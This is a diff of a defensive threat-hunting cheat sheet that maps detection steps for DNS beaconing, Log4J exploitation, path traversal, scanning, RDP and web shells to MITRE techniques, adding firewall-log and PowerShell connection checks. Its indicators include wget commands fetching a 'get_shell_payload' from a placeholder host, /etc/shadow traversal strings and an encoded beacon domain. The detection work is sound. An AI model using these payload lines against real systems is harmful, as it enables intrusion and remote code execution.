@@ -1,6 +1,7 @@
 # DNS Beaconing [T1071.004](https://attack.mitre.org/techniques/T1071/004/)
 1. Look for DNS traffic that contains encoded DNS question names like "dns.question.name	cm9vdEAxOTguNTEuMTAwLjI2LTg3NDU2dy1sc2xlZDEyLVNVU0UtNC4xMi4xNC05NC40MS1kZWZhdWx0ICMxIFNNUCBXZWQgT2N0IDMxIDEyOjI1OjA0IFVUQyAyMDE4ICgzMDkwOTAxKQo=.evil.local". Which decodes to DNS beacon. 
-
+2. Look at Firewall logs on the host at ```C:\Windows\System32\LogFiles\Firewall```. 
+3. Examine the DNS cache using ```Get-DnsClientCache | ? Entry -NotMatch "workst|servst|memes|kerb|ws|ocsp" | out-string -width 1000```. 
 
 # Find JNDI Exploitation/Log4J [T1190](https://attack.mitre.org/techniques/T1190/)
 1. Look for log traffic with ```wget http[:]//awk3hd9encccccA_diesla[:]8000/get_shell_payload``` and ```java log4j_execution.java wget http://awk3hd9encccccA_diesla:8000/get_shell_payload``` like attempts. It should contain Java within the command. 
@@ -14,6 +15,7 @@
 # Find Path Traversal
 1. Look for traffic with ```/etc/shadow``` and ```/etc/passwd``` in the traffic. 
 2. Look for traffic with ```%2E%2E%2F%2E%2E%2F``` url encoded data. 
+3. Look at Firewall logs on the host at ```C:\Windows\System32\LogFiles\Firewall```. 
 
 # Detect Self Signed Certificates [T1587.003](https://attack.mitre.org/techniques/T1587/003/)
 1. Identify Server or Client traffic in Wireshark with "Certificate, Server Key Exchange, Server Hello Done" and identify the issuer and subject. If same, then self signed. 
@@ -24,10 +26,12 @@
 # Detect Port Scanning [T1595.001](https://attack.mitre.org/techniques/T1595/001/)
 1. Filter traffic in WireShark for source and destination IP with SYN ACK (```tcp.flags == 0x0012```) to show ports that responded to SYN from the adversary. 
 2. Filter traffic in WireShark for source and destination IP with reset flag set by the target using ```tcp.flags.reset == 1```. 
+3. Look at Firewall logs on the host at ```C:\Windows\System32\LogFiles\Firewall```. 
 
 # Identify Web Scanning [T1595.003](https://attack.mitre.org/techniques/T1595/003/)
 1. Filter traffic in WireShark to display the various URIs and GET requests from HTTP traffic. A large number means adversary is web scanning. 
 2. Look for all subdomains during web scanning in WireShark with ````_ws.col.info == "HTTP/1.1 200 OK  (text/html)"````.
+3. Look at Firewall logs on the host at ```C:\Windows\System32\LogFiles\Firewall```. 
 
 # Identify LLMNR Poisoning [T1557.001](https://attack.mitre.org/techniques/T1557/001/)
 1. Filter for "LLMNR" traffic within wireshark pcap and identify numerous resquests and response failures from a machine. There will be NTLMSSP_NEGOTIATE, NTLMSSP_CHALLENGE, and NTLMSSP_AUTH messages. 
@@ -55,11 +59,17 @@
 9. Use [SRUM Dump](https://github.com/MarkBaggett/srum-dump) to examine system usages related to processes. 
 10. View old network connections at ```SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged``` or ```SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Managed``` or ```SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Nla\Cache```. 
 11. Use ```eventvwr.msc``` with Windows Security Event logs 5156 for Windows Filtering Platform permitted connections. 
+12. Look at Firewall logs on the host at ```C:\Windows\System32\LogFiles\Firewall```. 
+13. Use ```Get-NetTCPConnection | select LocalAddress,localport,remoteaddress,remoteport,state,@{name="process";Expression={(get-process -id $_.OwningProcess).ProcessName}}, @{Name="cmdline";Expression={(Get-WmiObject Win32_Process -filter "ProcessId = $($_.OwningProcess)").commandline}} | sort Remoteaddress -Descending | ft -wrap -autosize``` to look at TCP Connections. 
+14. Use ```Get-NetUDPEndpoint | select local*,creationtime, remote* | ft -autosize``` to look for UDP connections. 
 
 # View Network Flow to/from Workstations [No TTP]
 1. Use ```zeek``` with conn.log from a pcap
 	- ```zeek-cut``` can be beneficial on the command line to pick specific fields
 2. Use [Rita](https://github.com/activecm/rita) to find beaconing activity. 
+3. Look at Firewall logs on the host at ```C:\Windows\System32\LogFiles\Firewall```. 
+4. Use ```Get-NetTCPConnection | select LocalAddress,localport,remoteaddress,remoteport,state,@{name="process";Expression={(get-process -id $_.OwningProcess).ProcessName}}, @{Name="cmdline";Expression={(Get-WmiObject Win32_Process -filter "ProcessId = $($_.OwningProcess)").commandline}} | sort Remoteaddress -Descending | ft -wrap -autosize``` to look at TCP Connections. 
+5. Use ```Get-NetUDPEndpoint | select local*,creationtime, remote* | ft -autosize``` to look for UDP connections. 
 
 # View DHCP Leases [No TTP]
 1. Use ```zeek``` with dhcp.log from pcap
@@ -72,6 +82,8 @@
 2. Use Wireshark and filter on DNS traffic. 
 3. Use [Rita](https://github.com/activecm/rita) to find beaconing activity. 
 4. Use WireShark to find DNS zone transfers with ```dns.qry.type == 252```. 
+5. Look at Firewall logs on the host at ```C:\Windows\System32\LogFiles\Firewall```. 
+6. Check the DNS cache with ```Get-DnsClientCache | ? Entry -NotMatch "workst|servst|memes|kerb|ws|ocsp" | out-string -width 1000```. 
 
 # View SNMP Activity [No TTP]
 1. Use ```zeek``` with snmp.log from pcap
@@ -106,6 +118,7 @@
 		| rename host.name as Host, destination.port as Port
 		| sort network.bytes DESC
 		```
+4. Look at Firewall logs on the host at ```C:\Windows\System32\LogFiles\Firewall```. 
 
 # View GEO IP Information in Traffic [No TTP]
 1. Use ```zeek``` with the ```geoip-conn``` package. 
@@ -151,21 +164,27 @@
 1. Use Event ID 6272 within windows security logs for external IP of user. 
 
 # View RDP Connections [T1210](https://attack.mitre.org/techniques/T1210/) [T1563.002](https://attack.mitre.org/techniques/T1563/002/)
-1. Look for port 3389 connections within network traffic 
+1. Look for port 3389 connections within network traffic. 
+2. Look at Firewall logs on the host at ```C:\Windows\System32\LogFiles\Firewall```. 
+3. Run ```qwinsta``` on the command line to view RDP connections. 
 
 # View WMI Traffic [T1047](https://attack.mitre.org/techniques/T1047/)
 1. Identify traffic on port 135 or 137 with ```dce_rpc``` service. 
+2. Look at Firewall logs on the host at ```C:\Windows\System32\LogFiles\Firewall```. 
 
 # View Non Standard Port Traffic [T1509](https://attack.mitre.org/techniques/T1509/).
 1. Use PSReadline to view scriptblock activity. 
+2. Look at Firewall logs on the host at ```C:\Windows\System32\LogFiles\Firewall```. 
 
 # Identify Web Shells [T1505.003](https://attack.mitre.org/techniques/T1505/003/)
 1. Look for out of date browser agents with HTTP traffic on port 80. 
 2. Look for connections to webpages like ```.php, .aspx, .jsp, or .asp```. 
+3. Look at Firewall logs on the host at ```C:\Windows\System32\LogFiles\Firewall```. 
 
 # Identify Ping Sweeps
 1. Use tcpdump with ```-n``` to resolve.
-	- Command to use: ```tcpdump -r pcap 'host 92.242.140.21' -n```
+	- Command to use: ```tcpdump -r pcap 'host 92.242.140.21' -n```. 
+2. Look at Firewall logs on the host at ```C:\Windows\System32\LogFiles\Firewall```. 
 
 # Identify Sharphound/Bloodhound Activity [T1087](https://attack.mitre.org/techniques/T1087/) [T1482](https://attack.mitre.org/techniques/T1482/)[T1615](https://attack.mitre.org/techniques/T1615/)[T1069](https://attack.mitre.org/techniques/T1069/)[T1018](https://attack.mitre.org/techniques/T1018/) [T1033](https://attack.mitre.org/techniques/T1033/)
 1. Look for increase in traffic with destination port 445 and destination process ```ntoskrnl.exe``` to each workstation within a domain. 
